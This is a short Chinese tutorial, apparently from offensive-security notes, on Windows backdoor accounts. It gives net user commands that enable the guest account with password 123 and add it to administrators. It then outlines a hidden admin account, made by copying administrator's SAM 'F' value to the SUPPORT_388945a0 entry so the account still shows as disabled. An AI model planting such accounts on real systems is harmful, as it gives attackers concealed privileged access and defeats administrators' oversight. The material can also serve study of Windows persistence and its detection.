\----  网易云热评

  

一、将来宾账户启动

1、net user guest  /active:yes  启用guest用户

2、net user guest 123             设置密码为123

3、net localgroup administrators  guest /add  加到管理员组

  

二、创建隐藏用户

1、将用户SUPPORT\_388945a0设置成允许访问

![](../Images/b2caeb935c6bee9b03d707bf2f07cf2d.png)

2、打开注册表，找到用户名列表，查看对应的类型

![](../Images/ddc96b00d2ba517eb0b18aca2227d93f.png)

3、查看3E9的F值，并将administrator的F值复制到该处

![](../Images/8ea1e3a3648b98676d7c7ac191f7bc7b.png)

4、查看该用户状态依旧显示未启用
